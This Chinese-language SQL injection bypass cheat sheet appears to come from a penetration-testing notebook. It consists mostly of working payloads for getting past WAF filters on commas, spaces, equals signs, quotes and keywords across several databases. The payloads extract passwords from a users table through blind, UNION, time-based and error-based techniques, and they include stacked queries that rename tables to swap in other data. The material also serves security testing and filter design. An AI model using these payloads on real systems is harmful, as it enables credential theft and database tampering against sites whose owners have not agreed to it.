# 语法变体与函数替代绕过

> 核心思路：同一个功能在 SQL 中往往有多种写法。当过滤器封堵了最常用的形式，用等价语法或同类函数绕过去。

---

## 一、逗号绕过 — 用 SQL 标准语法消除逗号

最常见的盲注 payload 用 `SUBSTRING(str,1,1)`，三个参数之间有两个逗号。当 WAF 对逗号做严格过滤时，以下变体全部等价。

### 1.1 SUBSTRING / SUBSTR / MID 的四种等价写法

```sql
-- 形式1：标准逗号写法（最常被过滤）
SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)

-- 形式2：SQL 标准语法 FROM ... FOR ...（无逗号）
SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1)

-- 形式3：SUBSTR 简写（Oracle / SQLite 原生）
SUBSTR((SELECT password FROM users LIMIT 1), 1, 1)

-- 形式4：MID（MySQL 专有别名）
MID((SELECT password FROM users LIMIT 1), 1, 1)
```

**实际注入中的对比：**

```sql
-- 被过滤（含逗号）
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

-- 绕过写法1：FROM ... FOR ...
' AND SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1)='a'--

-- 绕过写法2：SUBSTR
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--

-- 绕过写法3：MID
' AND MID((SELECT password FROM users LIMIT 1),1,1)='a'--
```

**Oracle 特别注意** — `SUBSTR` 是 Oracle 的原生写法，`SUBSTRING` 反而不存在：

```sql
-- Oracle 专用
' AND SUBSTR((SELECT password FROM users WHERE ROWNUM<=1),1,1)='a'--
```

### 1.2 LIMIT 的两种等价写法

```sql
-- 标准逗号写法
LIMIT 0,1

-- OFFSET 写法（无逗号）
LIMIT 1 OFFSET 0
```

```sql
-- 被过滤
' UNION SELECT password FROM users LIMIT 0,1--

-- 绕过
' UNION SELECT password FROM users LIMIT 1 OFFSET 0--
```

### 1.3 IN 子句的逗号替代

```sql
-- 被过滤：IN (1,2,3) 中的逗号
' UNION SELECT 1,2,3 WHERE id IN (1,2,3)--

-- 绕过1：BETWEEN ... AND ... 当值连续时
' UNION SELECT 1,2,3 WHERE id BETWEEN 1 AND 3--

-- 绕过2：多个 OR 替代
' UNION SELECT 1,2,3 WHERE id=1 OR id=2 OR id=3--
```

### 1.4 INSERT 中逗号的替代（较少遇到）

```sql
-- 标准写法
INSERT INTO users (name, age) VALUES ('test', 18);

-- MySQL SET 语法替代（完全无逗号）
INSERT INTO users SET name='test', age=18;
-- 注意：SET 语法本身仍含逗号分隔多列，如果列名中的逗号也被过滤...
INSERT INTO users SET name='test';  -- 一次只设一列
```

## 二、空格绕过 — 用括号、注释、控制字符替代

```sql
-- 被过滤：UNION SELECT 中间的空格
' UNION SELECT 1,2,3--

-- 绕过1：注释块 /**/
' UNION/**/SELECT/**/1,2,3--

-- 绕过2：括号连写（对 Oracle 特别有效）
' UNION(SELECT(1),(2),(3))--

-- 绕过3：换行符 %0a / %0d
' UNION%0aSELECT%0a1,2,3--

-- 绕过4：制表符 %09
' UNION%09SELECT%091,2,3--

-- 绕过5：MySQL 版本号注释 /*!50000*/
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

## 三、等号绕过 — 比较操作的多种等价写法

```sql
-- 被过滤：=
' AND 1=1--

-- 绕过1：LIKE
' AND 1 LIKE 1--

-- 绕过2：REGEXP / RLIKE
' AND 1 REGEXP 1--

-- 绕过3：BETWEEN
' AND 1 BETWEEN 1 AND 1--

-- 绕过4：STRCMP (strcmp 相等返回 0)
' AND STRCMP(1,1)=0--
' AND NOT STRCMP(1,1)--          -- NOT 0 = TRUE

-- 绕过5：GREATEST / LEAST
' AND GREATEST(1,1)=1--

-- 绕过6：IN
' AND 1 IN (1)--

-- 绕过7：IS NOT DISTINCT FROM (PostgreSQL / MySQL 8.0.17+)
' AND 1 IS NOT DISTINCT FROM 1--

-- 绕过8：IS NULL（判断空值场景）
' AND (SELECT password FROM users WHERE id=1) IS NOT NULL--
' AND (SELECT password FROM users WHERE id=1) IS NULL--
```

## 四、引号绕过 — 字符串表示的五种方式

```sql
-- 被过滤：单引号 ' 或双引号 "
' UNION SELECT username,password FROM users WHERE username='admin'--

-- 绕过1：十六进制
' UNION SELECT username,password FROM users WHERE username=0x61646D696E--
-- 0x61646D696E = 'admin'

-- 绕过2：CHAR() 函数（MySQL）
' UNION SELECT username,password FROM users WHERE username=CHAR(97,100,109,105,110)--
-- CHAR(97,100,109,105,110) = 'admin'

-- 绕过3：CONCAT + CHAR（动态构造）
' UNION SELECT username,password FROM users WHERE username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))--

-- 绕过4：UNHEX()（MySQL）
' UNION SELECT username,password FROM users WHERE username=UNHEX('61646D696E')--

-- 绕过5：CHR()（PostgreSQL / Oracle）
' UNION SELECT username,password FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
```

**十六进制快速转换参考：**

| 字符 | 十六进制 | CHAR 值 |
|------|---------|---------|
| `a` | `61` | 97 |
| `d` | `64` | 100 |
| `m` | `6D` | 109 |
| `i` | `69` | 105 |
| `n` | `6E` | 110 |
| `~` | `7E` | 126 |
| `/` | `2F` | 47 |
| `0x` | `3078` | — |
| `NULL` | 直接写 `NULL` | — |

## 五、函数逐个替代对照表

### 5.1 字符串截取

| 被过滤 | 替代1 | 替代2 | 替代3 |
|--------|-------|-------|-------|
| `SUBSTRING(str,1,1)` | `SUBSTRING(str FROM 1 FOR 1)` | `SUBSTR(str,1,1)` | `MID(str,1,1)` |
| `SUBSTRING()` | `LEFT(str,1)` (仅左端) | `RIGHT(str,1)` (仅右端) | — |

### 5.2 字符串长度

| 被过滤 | 替代 |
|--------|------|
| `LENGTH(str)` | `CHAR_LENGTH(str)`, `CHARACTER_LENGTH(str)` |

### 5.3 字符串拼接

| 被过滤 | 替代 | 数据库 |
|--------|------|--------|
| `CONCAT(a,b)` | `CONCAT_WS(',',a,b)` | MySQL |
| `CONCAT(a,b)` | `a \|\| b` | PostgreSQL, Oracle, SQLite |
| `CONCAT(a,b)` | `a + b` | MSSQL |
| `GROUP_CONCAT(x)` | `STRING_AGG(x,',')` | PostgreSQL, MSSQL 2017+ |
| `GROUP_CONCAT(x)` | `LISTAGG(x,',') WITHIN GROUP (ORDER BY ...)` | Oracle |
| `GROUP_CONCAT(x)` | 逐行 `LIMIT 1 OFFSET n` 循环提取 | 通用 |

### 5.4 字符串定位

| 被过滤 | 替代 |
|--------|------|
| `INSTR(str,sub)` | `LOCATE(sub,str)`, `POSITION(sub IN str)` |
| `CHARINDEX(sub,str)` (MSSQL) | `PATINDEX('%sub%',str)` |

### 5.5 字符转换

| 被过滤 | 替代 | 说明 |
|--------|------|------|
| `ASCII(ch)` | `ORD(ch)` | MySQL / PostgreSQL 等价 |
| `ASCII(ch)` | `UNICODE(ch)` | 返回 Unicode 码点 |
| `CHAR(n)` | `CHR(n)` | PostgreSQL / Oracle |
| `UPPER(str)` | `UCASE(str)` | MySQL 别名 |
| `LOWER(str)` | `LCASE(str)` | MySQL 别名 |

### 5.6 延时函数

| 被过滤 | 替代 | 数据库 |
|--------|------|--------|
| `SLEEP(n)` | `BENCHMARK(5000000, MD5('a'))` | MySQL |
| `SLEEP(n)` | `GET_LOCK('test',n)` | MySQL |
| `SLEEP(n)` | 复杂正则: `SELECT RLIKE REPEAT('(a.*)+',n)` | MySQL |
| `SLEEP(n)` | `WAITFOR DELAY '0:0:n'` | MSSQL |
| `pg_sleep(n)` | `pg_sleep_for('n seconds')` | PostgreSQL |
| `SLEEP(n)` | `DBMS_LOCK.SLEEP(n)` | Oracle |
| `SLEEP(n)` | `DBMS_PIPE.RECEIVE_MESSAGE('x',n)` | Oracle |
| `SLEEP(n)` | `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(n*10000000))))` | SQLite |

### 5.7 报错注入函数

| 被过滤 | 替代 | 数据库 |
|--------|------|--------|
| `EXTRACTVALUE(xml, xpath)` | `UPDATEXML(xml, xpath, new)` | MySQL |
| `EXTRACTVALUE()` | `EXP(~(SELECT ...))` (MySQL 5.5.5+) | MySQL |
| `EXTRACTVALUE()` | `NAME_CONST(x, (SELECT ...))` | MySQL |
| `EXTRACTVALUE()` | `POLYGON() / MULTIPOLYGON()` 几何报错 | MySQL |
| `UPDATEXML()` | `BIGINT 溢出: SELECT ~0+!(SELECT ...)` | MySQL |

### 5.8 获取数据库信息

| 被过滤 | 替代 | 数据库 |
|--------|------|--------|
| `DATABASE()` | `SCHEMA()` | MySQL |
| `USER()` | `CURRENT_USER()`, `SYSTEM_USER()`, `SESSION_USER()` | 通用 |
| `@@version` | `VERSION()` | MySQL |
| `@@version` | `SELECT SERVERPROPERTY('productversion')` | MSSQL |
| `@@version` | `SELECT version()` | PostgreSQL |
| `@@version` | `SELECT * FROM v$version` | Oracle |
| `@@version` | `SELECT sqlite_version()` | SQLite |
| `DB_NAME()` | `SELECT name FROM master..sysdatabases` | MSSQL |

### 5.9 报错函数（MSSQL 特定）

| 被过滤 | 替代 |
|--------|------|
| `@@version` | `SELECT SERVERPROPERTY('productversion')` |
| `DB_NAME()` | `SELECT DB_NAME(0)`, `SELECT name FROM master..sysdatabases` |
| `HOST_NAME()` | `SELECT SERVERPROPERTY('machinename')` |
| `SYSTEM_USER` | 同 `SUSER_SNAME()` |

## 六、关键词拆分的 N 种写法

同一个函数名可以用多种方式拆分，绕过关键词匹配规则。

```sql
-- 目标：执行 SUBSTRING
-- 全部等价：

SUBSTRING(...)               -- 原始
SubString(...)               -- 大小写混合
SUB/**/STRING(...)           -- 注释拆分
SUB%0d%0aSTRING(...)         -- URL 编码换行拆分
SUBBSTRING(...)              -- 双写（假设 B 被删除 → SUBSTRING）
/*!SUBSTRING*/(...)           -- MySQL 版本号注释
SUBSTRING\N(...)              -- 反斜杠续行
```

## 七、完整场景示例

### 场景1：逗号 + 空格同时被过滤

```sql
-- 原始 payload（含逗号和空格）
' UNION SELECT 1,table_name,3 FROM information_schema.tables--

-- 绕过：
' UNION(SELECT(1),(table_name),(3)FROM(information_schema.tables))--
--        ↑括号替代空格            ↑括号嵌套消除所有空格
```

### 场景2：SUBSTRING + 逗号 + 等号同时被过滤

```sql
-- 原始 payload
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

-- 绕过：FROM...FOR... + LIKE + OFFSET
' AND SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0) FROM 1 FOR 1) LIKE 'a'--
--               ↑OFFSET替代逗号  ↑FROM...FOR替代逗号  ↑LIKE替代=
```

### 场景3：SLEEP + 引号同时被过滤

```sql
-- 原始 payload
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(2),0)--

-- 绕过：BENCHMARK + 十六进制 + FROM...FOR... + LIKE
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0) FROM 1 FOR 1) LIKE 0x61,BENCHMARK(5000000,MD5(0x79)),0)--
--      ↑SLEEP→BENCHMARK      ↑OFFSET            ↑FROM...FOR         ↑LIKE+hex替代='a'
```

### 场景4：information_schema 被过滤

```sql
-- 原始
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

-- 绕过1：MySQL innodb
' UNION SELECT group_concat(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=schema()--

-- 绕过2：MySQL sys schema (5.7+)
' UNION SELECT group_concat(table_name),NULL FROM sys.schema_table_statistics_with_buffer WHERE table_schema=database()--

-- 绕过3：MSSQL
' UNION SELECT name,NULL FROM sys.tables--

-- 绕过4：PostgreSQL
' UNION SELECT tablename,NULL FROM pg_catalog.pg_tables--

-- 绕过5：Oracle（压根没有 information_schema）
' UNION SELECT table_name,NULL FROM all_tables--

-- 绕过6：SQLite
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

### 场景5：MySQL 中 SELECT 被过滤（无法使用 UNION SELECT）

```sql
-- 方法1：Handler 绕过（详见 [[handler绕过]]）
' ;HANDLER users OPEN;HANDLER users READ FIRST;--

-- 方法2：预编译绕过（详见 [[预编译绕过]]）
' ;SET @s=CONCAT('SEL','ECT * FROM users');PREPARE p FROM @s;EXECUTE p;--

-- 方法3：重命名绕过（详见 [[重命名绕过]]）
' ;ALTER TABLE users RENAME TO tmp;ALTER TABLE secret RENAME TO users;--
```

## 八、快速索引：遇到过滤时该查哪里

| 被过滤的内容 | 优先看 |
|-------------|--------|
| 逗号 `,` | 第一章：FROM...FOR... / OFFSET / BETWEEN...AND |
| 空格 | 第二章：/**/ / () / %0a |
| 等号 `=` | 第三章：LIKE / REGEXP / BETWEEN / STRCMP |
| 引号 `'` `"` | 第四章：0x十六进制 / CHAR() / CHR() |
| `SUBSTRING` | 5.1 节：MID / SUBSTR / LEFT / RIGHT |
| `SLEEP` | 5.6 节：BENCHMARK / WAITFOR / pg_sleep |
| `EXTRACTVALUE` | 5.7 节：UPDATEXML / EXP / 几何函数 |
| `information_schema` | 第七章场景4：各数据库替代表 |
| `SELECT` 关键字 | 第七章场景5：Handler / 预编译 / 重命名 |
| `GROUP_CONCAT` | 5.3 节：STRING_AGG / LISTAGG / 逐行提取 |
| 关键词整体被识别 | 第六章：大小写 / 注释分割 / 双写 / 内联注释 |
